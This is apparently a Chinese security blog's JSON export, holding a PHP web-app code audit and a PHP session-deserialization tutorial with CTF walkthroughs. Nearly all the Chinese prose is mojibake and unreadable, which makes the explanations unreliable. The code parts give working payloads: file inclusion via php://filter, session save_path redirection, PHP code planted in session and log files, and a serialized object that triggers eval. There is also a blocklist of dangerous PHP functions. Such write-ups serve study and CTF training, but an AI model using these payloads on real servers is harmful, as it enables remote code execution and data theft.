æ¥ç€æ£€æµ‹æ˜¯å¦ä»¥getæ–¹å¼ä¼ å…¥pageå˜é‡ï¼Œå¦‚æœæœ‰åˆ™è°ƒç”¨filteræ–¹æ³•è¿‡æ»¤å˜é‡ä¸­çš„æ•°æ®ï¼Œæœ€åå†è°ƒç”¨echoContentæ–¹æ³•åŠ è½½é¡µé¢ã€‚ é‚£ä¹ˆç½‘ç«™çš„ç›®å½•ç»“æ„ä¹Ÿå°±å¤§æ¦‚æ¸…æ¥šäº†ï¼Œlibraryä¸­åŒ…å«å…¬å…±æ–‡ä»¶å’Œæ¸²æŸ“æ–‡ä»¶ï¼Œlogsä¸­è®°å½•æ—¥å¿—ï¼Œstaticæ˜¯ä¸€äº›é™æ€èµ„æºæ–‡ä»¶ï¼Œviews ç±»ä¼¼è§†å›¾æ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­åŒ…å«äº†HTMLä»£ç ï¼Œå„ä¸ªæ¨¡å—é€šè¿‡action.phpPOSTå‚æ•°è·³è½¬åˆ°ç›¸åº”åŠŸèƒ½æ¨¡å—çš„PHPæ–‡ä»¶ã€‚ 0x02 å·¥å…·æ‰«æ é¦–å…ˆä¸Šå·¥å…·ï¼Œç”¨Seayå’Œripsæ‰«ä¸€éï¼š ripsç»“æœï¼š Seayç»“æœï¼š è¿™ä¸¤ä¸ªå·¥å…·éƒ½æåˆ°äº†action.phpä¸­çš„require_once()å‡½æ•°ï¼Œé‚£å°±ä»è¿™ä¸ªåœ°æ–¹å‡ºå‘ã€‚ 0x03 å®¡è®¡è¿‡ç¨‹ action.phpæ–‡ä»¶åŒ…å« 1234567891011//action.php&lt;?phprequire_once(&quot;library/common.php&quot;);require_once(&quot;library/view.php&quot;);$page = filter($_POST[&#x27;page&#x27;]).&#x27;.php&#x27;;$post_data = array();foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value;&#125;@require_once($page);?&gt; POSTä¸€ä¸ªpageå˜é‡æ—¶ï¼Œç»è¿‡filterå‡½æ•°å¤„ç†ï¼Œæœ€ååˆ©ç”¨require_once()åŒ…å«è¿›æ¥ã€‚ filter()å‡½æ•°äº†è¿‡æ»¤.ï¼Œå¹¶ä¸”é™å®šäº†æ–‡ä»¶åç¼€åä¸º.phpï¼Œé‚£ä¹ˆè¿™ä¸ªç‚¹çš„åˆ©ç”¨æ€è·¯å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼šä½¿ç”¨ç»å¯¹è·¯å¾„çš„æ–¹å¼ä¼ å…¥$pageå‚æ•°è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œå¦å¤–ï¼Œå¦‚æœPHPç‰ˆæœ¬å°äº5.4.3ï¼Œè¿˜å¯ä»¥ä½¿ç”¨%00æˆªæ–­çš„æ–¹å¼è¯»å–ä»»æ„åç¼€åçš„æ–‡ä»¶ã€‚ åˆ©ç”¨æ–¹å¼ï¼š normaliz.phpå˜é‡è¦†ç›– æ ¹æ®å·¥å…·æ‰«æç»“æœå®¡è®¡normaliz.phpæ–‡ä»¶ã€‚ 123456789101112131415161718192021222324252627282930313233// normaliz.php&lt;?phprequire_once(&quot;library/common.php&quot;);require_once(&quot;library/view.php&quot;);function action($post_data, $ip_replacement, $mail_replacement)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; try&#123; if ($method == &#x27;/\\\\d+\\\\.\\\\d+\\\\.\\\\d+\\\\.\\\\d+/&#x27;) &#123; $res = preg_replace($method, $ip_replacement, $source); &#125; else &#123; $res = preg_replace($method, $mail_replacement, $source); &#125; &#125; catch(Exception $e) &#123; write_log($e-&gt;getMessage()); $res=$source; &#125; return $res;&#125;$view_class = new View();$data = array();$data[&#x27;page&#x27;] = &#x27;normaliz&#x27;;$ip_replacement = &#x27;222.222.222.222&#x27;;$mail_replacement = &#x27;lollol@lol.com&#x27;;$data[&#x27;res&#x27;] = action($post_data, $ip_replacement, $mail_replacement);$view_class-&gt;echoContent($data[&#x27;page&#x27;], $data);?&gt; ç¬¬12è¡Œå’Œ16è¡Œä»£ç çœ‹åˆ°ä¸€ä¸ªæ¯”è¾ƒæ•æ„Ÿçš„å‡½æ•°preg_replace()ï¼Œåœ¨PHP7.0ç‰ˆæœ¬ä¹‹å‰å¯ä»¥ä½¿ç”¨/eæ¨¡å¼æ‰§è¡ŒPHPä»£ç ã€‚ å…¶ä¸­éƒ½éœ€è¦ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼š$methodã€$ip_replacementæˆ–$mail_repalcementã€$sourceï¼Œè¿™ä¸‰ä¸ªå‚æ•°éƒ½å¯ä»¥é€šè¿‡ç¬¬7è¡Œçš„$$æ“ä½œç¬¦è¿›è¡Œå˜é‡è¦†ç›–ã€‚è€Œpost_dataå‚æ•°æ˜¯åœ¨action.phpé€šè¿‡POSTæ¥èµ‹å€¼ï¼Œé‚£ä¹ˆåˆ©ç”¨æ–¹å¼å°±æ¯”è¾ƒæ¸…æ¥šäº†ï¼š common.phpä»»æ„æ–‡ä»¶å†™å…¥ é¦–å…ˆçœ‹åˆ°file_put_contents()å‡½æ•° 123456// common.phpfunction write_log($input)&#123; global $cfg_logfile; file_put_contents($cfg_logfile, $input, FILE_APPEND);&#125; å…¨å±€æŸ¥æ‰¾$cfg_logfileå‚æ•° å›æº¯$inputå‚æ•°ï¼Œå‘ç°load_file()ä¸­è°ƒç”¨äº†write_log()å‡½æ•°ï¼š 12345678910111213// common.phpfunction loadFile($filePath)&#123; global $cfg_basedir; if(!file_exists($filePath))&#123; write_log(&#x27;Try to open Null file:&#x27;.$filePath); return file_get_contents($cfg_basedir.&#x27;/error.php&#x27;); &#125; $fp = @fopen($filePath,&#x27;r&#x27;); $sourceString = @fread($fp,filesize($filePath)); @fclose($fp); return $sourceString;&#125; å›æº¯$file_pathå‚æ•°ï¼Œå‘ç°åœ¨view.phpä¸­çš„echo_content()è°ƒç”¨äº†loadfile()å‡½æ•°ï¼š 12345678910// view.phpfunction echoContent($vId, $data) &#123; $this-&gt;data = $data; $content = loadFile(&quot;views/&quot;.$vId.&quot;.php&quot;); $content = $this-&gt;parseHeadAndFoot($content); $content = $this-&gt;parseVal($content); $content = $this-&gt;parseIf($content); echo $content; &#125; æ¥ç€å›æº¯$vIdå‚æ•°ï¼ŒæŸ¥çœ‹echoContent()å‡½æ•°çš„è°ƒç”¨æƒ…å†µï¼š ä¸»è¦æ˜¯åˆ†ä¸¤å¤§ç±»ï¼š phpcom.phpã€md5.phpå’Œnormaliz.phpéƒ½æ˜¯åœ¨action.phpä¸­é€šè¿‡ä¼ å…¥pageå˜é‡ï¼Œä»è€ŒåŒ…å«è¿›æ¥çš„ï¼Œæ•…ä¸å¯æ§ï¼› index.phpä¸‹ä¼ å…¥çš„æ˜¯pageå˜é‡ é‚£ä¸ªå°±å¯ä»¥é€šè¿‡GETæ–¹å¼ç»™pageå˜é‡èµ‹å€¼ï¼Œå†™å…¥æ–‡ä»¶å†…å®¹ï¼Œç„¶åé€šè¿‡write_log()å‡½æ•°å†™å…¥logfile.phpæ–‡ä»¶ä¸­ï¼Œåˆ©ç”¨æ–¹å¼ï¼š å…ˆå†™å…¥&lt;?php phpinfo(); ?&gt; æ¥ç€é€šè¿‡action.phpæ–‡ä»¶åŒ…å«æ¥æ‰§è¡Œå‘½ä»¤ï¼š å…¶å®è¿™é‡Œç”¨phpæ–‡ä»¶å»å­˜å‚¨æ—¥å¿—å°±å¾ˆç¦»è°±ã€‚ view.phpä»£ç æ‰§è¡Œ è¿™ä¸ªç‚¹è¿˜æ˜¯æ¯”è¾ƒæœ‰éš¾åº¦çš„","tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"ä»£ç å®¡è®¡/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"PHPååºåˆ—åŒ–å­¦ä¹ -sessionååºåˆ—åŒ–","date":"2020-05-30T06:58:14.000Z","path":"Web_security/php_related/4.PHPååºåˆ—åŒ–å­¦ä¹ -sessionååºåˆ—åŒ–/","text":"PHPååºåˆ—åŒ–æ¼æ´å­¦ä¹ â€”â€”Sessionååºåˆ—åŒ– 0x01 PHPçš„Sessionæœºåˆ¶ åœ¨å­¦ä¹  session ååºåˆ—åŒ–ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£è¿™å‡ ä¸ªå‚æ•°çš„å«ä¹‰ã€‚ Directive å«ä¹‰ session.save_handler sessionä¿å­˜å½¢å¼ã€‚é»˜è®¤ä¸ºfiles session.save_path sessionä¿å­˜è·¯å¾„ã€‚ session.serialize_handler sessionåºåˆ—åŒ–å­˜å‚¨æ‰€ç”¨å¤„ç†å™¨ã€‚é»˜è®¤ä¸ºphp session.upload_progress.cleanup ä¸€æ—¦è¯»å–äº†æ‰€æœ‰POSTæ•°æ®ï¼Œç«‹å³æ¸…é™¤è¿›åº¦ä¿¡æ¯ã€‚é»˜è®¤å¼€å¯ session.upload_progress.enabled å°†ä¸Šä¼ æ–‡ä»¶çš„è¿›åº¦ä¿¡æ¯å­˜åœ¨sessionä¸­ã€‚é»˜è®¤å¼€å¯ã€‚ åœ¨ä¸Šè¿°çš„é…ç½®ä¸­ï¼Œsession.serialize_handleræ˜¯ç”¨æ¥è®¾ç½®sessionçš„åºåˆ—è¯å¼•æ“çš„ï¼Œé™¤äº†é»˜è®¤çš„PHPå¼•æ“ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨å…¶ä»–å¼•æ“ï¼Œä¸åŒçš„å¼•æ“æ‰€å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒã€‚ å¤„ç†å™¨åç§° å­˜å‚¨æ ¼å¼ php é”®å + ç«–çº¿ + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ php_binary é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ php_serialize ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„ é‚£ä¹ˆå…·ä½“è€Œè¨€ï¼Œåœ¨é»˜è®¤é…ç½®æƒ…å†µä¸‹ï¼š 12345&lt;?phpsession_start()$_SESSION[&#x27;name&#x27;] = &#x27;ca01h&#x27;;var_dump();?&gt; SESSIONæ–‡ä»¶çš„å†…å®¹æ˜¯ï¼šname|s:5:&quot;ca01h&quot;ï¼Œnameæ˜¯é”®å€¼ï¼Œs:5:&quot;ca01h&quot;;æ˜¯serialize(&quot;ca01h&quot;)çš„ç»“æœã€‚ åœ¨php_serializeå¼•æ“ä¸‹ï¼š 123456&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;name&#x27;] = &#x27;ca01h&#x27;;var_dump();?&gt; SESSIONæ–‡ä»¶çš„å†…å®¹æ˜¯a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;ca01h&quot;;&#125;ã€‚a:1æ˜¯ä½¿ç”¨php_serializeè¿›è¡Œåºåˆ—è¯éƒ½ä¼šåŠ ä¸Šã€‚åŒæ—¶ä½¿ç”¨php_serializeä¼šå°†sessionä¸­çš„keyå’Œvalueéƒ½ä¼šè¿›è¡Œåºåˆ—åŒ–ã€‚ åœ¨php_binaryå¼•æ“ä¸‹ï¼š 123456&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_binary&#x27;);session_start();$_SESSION[&#x27;name&#x27;] = &#x27;ca01h&#x27;;var_dump();?&gt; SESSIONæ–‡ä»¶çš„å†…å®¹æ˜¯\u0004names:6:&quot;spoock&quot;;ã€‚ç”±äºnameçš„é•¿åº¦æ˜¯4ï¼Œ4åœ¨ASCIIè¡¨ä¸­å¯¹åº”çš„å°±æ˜¯EOTã€‚æ ¹æ®php_binaryçš„å­˜å‚¨è§„åˆ™ï¼Œæœ€åå°±æ˜¯\u0004names:6:&quot;spoock&quot;;ã€‚ 0x02 PHP Sessionååºåˆ—åŒ–çš„æ¼æ´åŸå›  PHPä¸­çš„Sessionçš„å®ç°æ˜¯æ²¡æœ‰çš„é—®é¢˜ï¼Œå±å®³ä¸»è¦æ˜¯ç”±äºç¨‹åºå‘˜çš„Sessionä½¿ç”¨ä¸å½“è€Œå¼•èµ·çš„ã€‚ å¦‚æœåœ¨PHPåœ¨ååºåˆ—åŒ–å­˜å‚¨çš„$_SESSIONæ•°æ®æ—¶ä½¿ç”¨çš„å¼•æ“å’Œåºåˆ—åŒ–ä½¿ç”¨çš„å¼•æ“ä¸ä¸€æ ·ï¼Œä¼šå¯¼è‡´æ•°æ®æ— æ³•æ­£ç¡®ç¬¬ååºåˆ—åŒ–ã€‚é€šè¿‡ç²¾å¿ƒæ„é€ çš„æ•°æ®åŒ…ï¼Œå°±å¯ä»¥ç»•è¿‡ç¨‹åºçš„éªŒè¯æˆ–è€…æ˜¯æ‰§è¡Œä¸€äº›ç³»ç»Ÿçš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼š 1$_SESSION[&#x27;ca01h&#x27;] = &#x27;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#x27;; ä¸Šé¢çš„ $_SESSION æ•°æ®ï¼Œåœ¨å­˜å‚¨æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸º php_serializeï¼Œå­˜å‚¨çš„æ ¼å¼å¦‚ä¸‹ï¼š 1a:1:&#123;s:5:&quot;ca01h&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125; åœ¨è¯»å–æ•°æ®æ—¶å¦‚æœç”¨çš„ååºåˆ—åŒ–å¤„ç†å™¨ä¸æ˜¯ php_serializeï¼Œè€Œæ˜¯ php çš„è¯ï¼Œé‚£ä¹ˆååºåˆ—åŒ–åçš„æ•°æ®å°†ä¼šå˜æˆï¼š 123456789&lt;?phpvar_dump($_SESSION);?&gt;array(1) &#123; [&quot;a:1:&#123;s:5:&quot;ca01h&quot;;s:20:&quot;&quot;]=&gt; object(stdClass)#1 (0) &#123; &#125;&#125; è¿™æ˜¯å› ä¸ºå½“ä½¿ç”¨phpå¼•æ“çš„æ—¶å€™ï¼Œphpå¼•æ“ä¼šä»¥|ä½œä¸ºä½œä¸ºkeyå’Œvalueçš„åˆ†éš”ç¬¦ï¼Œé‚£ä¹ˆå°±ä¼šå°†a:1:&#123;s:5:&quot;ca01h&quot;;s:20:&quot;ä½œä¸ºSESSIONçš„keyï¼Œå°†O:8:&quot;stdClass&quot;:0:&#123;&#125;ä½œä¸ºvalueï¼Œç„¶åè¿›è¡Œååºåˆ—åŒ–ï¼Œæœ€åå°±ä¼šå¾—åˆ°stdClassè¿™ä¸ªç±»ã€‚ å®é™…åˆ©ç”¨çš„è¯ä¸€èˆ¬åˆ†ä¸ºä¸¤ç§ï¼š session.auto_start=On å½“é…ç½®é€‰é¡¹ session.auto_startï¼Onï¼Œä¼šè‡ªåŠ¨æ³¨å†Œ Session ä¼šè¯ï¼ˆç›¸å½“äºæ‰§è¡Œäº†session_start()ï¼‰ï¼Œå› ä¸ºè¯¥è¿‡ç¨‹æ˜¯å‘ç”Ÿåœ¨è„šæœ¬ä»£ç æ‰§è¡Œå‰ï¼Œæ‰€ä»¥åœ¨è„šæœ¬ä¸­è®¾å®šçš„åŒ…æ‹¬åºåˆ—åŒ–å¤„ç†å™¨åœ¨å†…çš„ session ç›¸å…³é…é€‰é¡¹çš„è®¾ç½®æ˜¯ä¸èµ·ä½œç”¨çš„ã€‚å› æ­¤ä¸€äº›éœ€è¦åœ¨è„šæœ¬ä¸­è®¾ç½®åºåˆ—åŒ–å¤„ç†å™¨é…ç½®çš„ç¨‹åºä¼šåœ¨ session.auto_startï¼On æ—¶ï¼Œé”€æ¯è‡ªåŠ¨ç”Ÿæˆçš„ Session ä¼šè¯ã€‚ç„¶åè®¾ç½®éœ€è¦çš„åºåˆ—åŒ–å¤„ç†å™¨ï¼Œå†è°ƒç”¨ session_start() å‡½æ•°æ³¨å†Œä¼šè¯ï¼Œè¿™æ—¶å¦‚æœè„šæœ¬ä¸­è®¾ç½®çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸ php.ini ä¸­è®¾ç½®çš„ä¸åŒï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚ 123456789// foo1.phpif(ini_get(&#x27;session.auto_start&#x27;)) session_destroy();ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();if(isset($_GET[&#x27;test&#x27;])) $_SESSION[&#x27;test&#x27;] = $_GET[&#x27;test&#x27;]; è®¿é—®http://127.0.0.1/test/serialize/foo1.php?test=|O:8:&quot;stdClass&quot;:0:&#123;&#125; å¦‚æœåœ¨è¿™ä¸ªsessionè®¾ç½®æˆåŠŸåï¼Œæœ‰å…¶ä»–çš„é¡µé¢ä½¿ç”¨è¿™ä¸ªsessionï¼Œç”±äºå¤„ç†å™¨çš„ä¸åŒï¼Œå°±ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚ç„¶è€ŒPHPè‡ªåŠ¨æ³¨å†ŒSessionä¼šè¯æ˜¯åœ¨è„šæœ¬æ‰§è¡Œå‰ï¼Œæ‰€ä»¥é€šè¿‡è¯¥æ–¹å¼åªèƒ½æ³¨å…¥PHPçš„å†…ç½®ç±»ã€‚ 123&lt;?php// foo2.phpvar_dump($_SESSION); php.inié…ç½®ä¸­session_use_trans_sid = 1æ‰èƒ½è·¨é¡µé¢è®¿é—®SESSION session.auto_start=Off å½“é…ç½®é€‰é¡¹ session.auto_startï¼Offï¼Œä¸¤ä¸ªè„šæœ¬æ³¨å†Œ Session ä¼šè¯æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸åŒï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜ï¼Œå¦‚ä¸‹é¢çš„ä»£ç ï¼š 123456&lt;?php// foo1.phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;test&#x27;] = $_GET[&#x27;test&#x27;]; 1234567891011121314 &lt;?php // foo2.php session_start(); class test &#123; var $hi; function __wakeup() &#123; echo &#x27;hi&#x27;; &#125; function __destruct() &#123; echo $this-&gt;hi; &#125;&#125; 0x03 ä¾‹é¢˜è§£æ 2018 XCTF Final bestphp é¢˜ç›®ç¯å¢ƒï¼šhttps://github.com/shimmeris/CTF-Web-Challenges/tree/master/File-Inclusion/XCTF-Final-2018-Bestphp ç›´æ¥ç»™å‡ºäº†index.phpçš„æºç ï¼š call_user_func()å‡½æ•°ä¸­çš„ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯å¯æ§çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥å›è°ƒextract()å‡½æ•°ç”¨æˆ·å˜é‡è¦†ç›–ï¼Œè¿›è€Œè¯»å–æœ¬åœ°æ–‡ä»¶ï¼š http://192.168.153.133:8003/?function=extract&amp;file=php://filter/read=convert.base64-encode/resource=function.php 123456789&lt;?phpfunction filters($data)&#123; foreach($data as $key=&gt;$value)&#123; if(preg_match(&#x27;/eval|assert|exec|passthru|glob|system|popen/i&#x27;,$value))&#123; die(&#x27;Do not hack me!&#x27;); &#125; &#125;&#125;?&gt; http://192.168.153.133:8003/?function=extract&amp;file=php://filter/read=convert.base64-encode/resource=admin.php 123456789hello admin&lt;?phpif(empty($_SESSION[&#x27;name&#x27;]))&#123; session_start(); #echo &#x27;hello &#x27; + $_SESSION[&#x27;name&#x27;];&#125;else&#123; die(&#x27;you must login with admin&#x27;);&#125;?&gt; æ¥ä¸‹æ¥ä¸»è¦è®¨è®ºsessionæ¼æ´åˆ©ç”¨é—®é¢˜session+lfiï¼Œç”±äºä»£ç ï¼š 1ini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html:/tmp&#x27;); é™åˆ¶äº†æˆ‘ä»¬æ— æ³•ç›´æ¥å»åŒ…å«é»˜è®¤çš„è·¯å¾„ï¼š 1&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_phpsessid å¸¸è§çš„Sessionå­˜å‚¨ä½ç½®ï¼š /var/lib/php/sess_PHPSESSID /var/lib/php/sessions/sess_PHPSESSID /var/lib/php5/sess_PHPSESSID /var/lib/php5/sessions/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID ä½†æ˜¯å› ä¸ºæœ‰å˜é‡è¦†ç›–å› æ­¤å¯ä»¥é€šè¿‡session_start()ï¼Œæ”¹å˜save_pathçš„æ–¹å¼è®©sessionå­˜å‚¨è·¯å¾„åœ¨open_basedirå…è®¸çš„ç›®å½•ä¸‹ï¼š 1?function&#x3D;session_start&amp;save_path&#x3D;&#x2F;tmp ç„¶åå»åŒ…å«ï¼š 1?function&#x3D;extract&amp;file&#x3D;&#x2F;tmp&#x2F;sess_arfguipj1mthu7bkma10j0f5o3 è¿™é‡Œæœ‰ä¸€ä¸ª$_SESSION['name']ï¼Œå¹¶ä¸”å…¶å¯ä»¥è¢«æˆ‘ä»¬postçš„nameå¤åˆ¶ï¼Œé‚£è¿™å°±å¯ä»¥è¾¾åˆ°æ§åˆ¶sessionå†…å®¹çš„ç›®çš„ã€‚ ä½¿ç”¨Hackbarç›´æ¥POSTæ•°æ®ï¼š 1name&#x3D;&lt;?&#x3D;phpinfo();?&gt; å†å»åŒ…å«å¯¹åº”çš„sessionï¼š 1?function&#x3D;extract&amp;file&#x3D;&#x2F;tmp&#x2F;sess_arfguipj1mthu7bkma10j0f5o3 åé¢æ‰¾åˆ°flagç›´æ¥catå³å¯ã€‚ ä»‹ç»å¦å¤–ä¸€ç§æ€è·¯ï¼šPHP7.0æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ åŒ…å«è‡ªèº«ä»è€Œå¯¼è‡´æ­»å¾ªç¯ï¼šhttps://xz.aliyun.com/t/3174#toc-4 jarvisoj PHPINFO é¢˜ç›®åœ°å€ï¼šhttp://web.jarvisoj.com:32784 åœ¨è®²è¿™é“é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥ä»‹ç»ä¸€ä¸‹session.upload_progress.enabled å½“ session.upload_progress.enabled INI é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚ è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€ã€‚ å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨$_SESSIONä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯session.upload_progress.prefix ä¸ session.upload_progress.nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚ 1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = &#x27;phpinfo();&#x27;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET[&#x27;phpinfo&#x27;]))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents(&#x27;index.php&#x27;));&#125;?&gt; è¿™é“é¢˜æ¶‰åŠåˆ°ä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼Œç¬¬ä¸€ä¸ªçŸ¥è¯†ç‚¹å°±æ˜¯PHP Session åºåˆ—åŒ–åŠååºåˆ—åŒ–å¤„ç†å™¨è®¾ç½®ä½¿ç”¨ä¸å½“ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒINIä¸­é»˜è®¤çš„å¤„ç†å™¨æ˜¯php_serializeï¼Œè€Œç¨‹åºä½¿ç”¨çš„å´æ˜¯phpå¤„ç†å™¨ã€‚ å½¢æˆçš„åŸç†å°±æ˜¯åœ¨ç”¨session.serialize_handler = php_serializeå­˜å‚¨çš„å­—ç¬¦å¯ä»¥å¼•å…¥ | , å†ç”¨session.serialize_handler = phpæ ¼å¼å–å‡º$_SESSIONçš„å€¼æ—¶ï¼Œ |ä¼šè¢«å½“æˆé”®å€¼å¯¹çš„åˆ†éš”ç¬¦ï¼Œåœ¨ç‰¹å®šçš„åœ°æ–¹ä¼šé€ æˆååºåˆ—åŒ–æ¼æ´ã€‚ ç¬¬äºŒä¸ªçŸ¥è¯†ç‚¹å°±æ˜¯Upload progress in sessionsï¼Œå½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶ post ä¸€ä¸ªä¸ ini è®¾ç½®çš„ session.upload_progress.name åŒåå˜é‡æ—¶ï¼Œphp æ£€æµ‹åˆ°è¿™ç§ post è¯·æ±‚æ—¶å°±ä¼šåœ¨ $SESSION ä¸­æ·»åŠ ä¸€ç»„æ•°æ®ï¼Œæ‰€ä»¥å¯é€šè¿‡ session.upload_progress æ¥è®¾ç½® sessionã€‚ é¦–å…ˆæ„é€ ä¸€ä¸ªä¸Šä¼ è¡¨å•ï¼š 12345&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; å†æ„é€ expï¼š 1234567891011121314151617&lt;?php class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = &#x27;phpinfo();&#x27;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;$a=new OowoO();$a-&gt;mdzz=&quot;var_dump(scandir(&#x27;./&#x27;));&quot;;echo serialize($a); ä¿®æ”¹æ–‡ä»¶å†…å®¹ï¼š ä»phpinfoä¸­å¯ä»¥çœ‹åˆ°ç½‘ç«™çš„æ ¹ç›®å½•åœ¨/opt/lampp/htdocs file_get_contents()è¯»å–æ–‡ä»¶ æ–°æ˜¥æˆ˜å½¹2020 hackme è´´ä¸Šå‡ºé¢˜çš„kaixinå¸ˆå‚…çš„writeupï¼šhttps://www.mrkaixin.top/posts/df9f633e/#5-0-hackme æ²¡æœ‰å¤ç°ç¯å¢ƒï¼Œè¿™é‡Œå°±ä¸»è¦è¯´è€ƒå¯Ÿåˆ°çš„çŸ¥è¯†ç‚¹ï¼š PHP Sessionååºåˆ—åŒ– profile.phpä¸­session.serialize_handlerç”¨çš„æ˜¯phpï¼Œè€Œinit.phpä¸­è®¾ç½®çš„æ˜¯php_serializeï¼Œè¿™æ ·å°±å¯ä»¥å‚è€ƒå‰é¢æåˆ°çš„PHP Sessionååºåˆ—åŒ–æ¼æ´ã€‚ dataåè®®ä»¥åŠ4å­—å‘½ä»¤æ³¨å…¥ æŒ–æ´æŠ€å·§ï¼šå¦‚ä½•ç»•è¿‡URLé™åˆ¶ ã€CTF æ”»ç•¥ã€‘å¦‚ä½•ç»•è¿‡å››ä¸ªå­—ç¬¦é™åˆ¶getshell è¿™ä¸ªè€ƒç‚¹éœ€è¦å¦å¤–å†™ä¸€ç¯‡æ•´ç†ä¸€ä¸‹ã€‚ 0x04 Reference Title Url å¸¦ä½ èµ°è¿›PHP sessionååºåˆ—åŒ–æ¼æ´ https://xz.aliyun.com/t/6640#toc-9 PHPååºåˆ—åŒ–æ€»ç»“ https://www.cnblogs.com/tr1ple/p/11156279.html#sna43nW4 PHPååºåˆ—åŒ–å…¥é—¨ä¹‹sessionååºåˆ—åŒ– https://mochazz.github.io/2019/01/29/PHPååºåˆ—åŒ–å…¥é—¨ä¹‹sessionååºåˆ—åŒ–/#PHPçš„sessionæœºåˆ¶ GYCTF Hackme 